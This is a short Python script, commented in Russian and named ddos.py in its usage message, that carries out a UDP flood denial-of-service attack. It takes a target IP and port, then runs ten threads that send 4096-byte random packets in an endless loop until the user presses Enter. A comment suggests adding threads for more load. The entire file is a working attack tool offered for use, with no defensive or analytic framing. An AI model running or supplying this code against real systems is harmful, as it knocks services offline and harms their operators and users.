import sys
import socket
import random
import threading
import time

# Проверка аргументов командной строки
if len(sys.argv) < 3:
    print("Использование: python3 ddos.py <target_ip> <target_port>")
    sys.exit(1)

# Принимаем IP и порт из аргументов командной строки
target_ip = sys.argv[1]
target_port = int(sys.argv[2])

# Настройка для отправки пакетов
bytes = random._urandom(4096)  # Увеличенный размер пакета до 4096 байт
packet_count = 0  # Счетчик отправленных пакетов
stop_attack = False  # Флаг для остановки атаки

print(f"Начинаю атаку на {target_ip} по порту {target_port}...")

# Функция для отправки пакетов в отдельном потоке
def send_packets():
    global packet_count, stop_attack
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_attack:
        try:
            sock.sendto(bytes, (target_ip, target_port))
            packet_count += 1
            print(f"Отправлено пакетов: {packet_count}", end="\r")  # Отображение счетчика на одной строке
        except Exception as e:
            print(f"\nОшибка: {e}")
            break

# Функция для остановки атаки
def stop_ddos():
    global stop_attack
    input("\nНажмите Enter для остановки атаки...")
    stop_attack = True
    print("Атака остановлена!")

# Запускаем несколько потоков для усиления атаки
num_threads = 10  # Количество потоков, можно увеличить для большей нагрузки
threads = []

# Запуск функции остановки в отдельном потоке
stop_thread = threading.Thread(target=stop_ddos)
stop_thread.start()

# Запуск потоков для отправки пакетов
for i in range(num_threads):
    thread = threading.Thread(target=send_packets)
    thread.start()
    threads.append(thread)

# Ожидание завершения всех потоков
for thread in threads:
    thread.join()

# Ожидаем завершения потока для остановки атаки
stop_thread.join()

print("\nВсе потоки завершены.")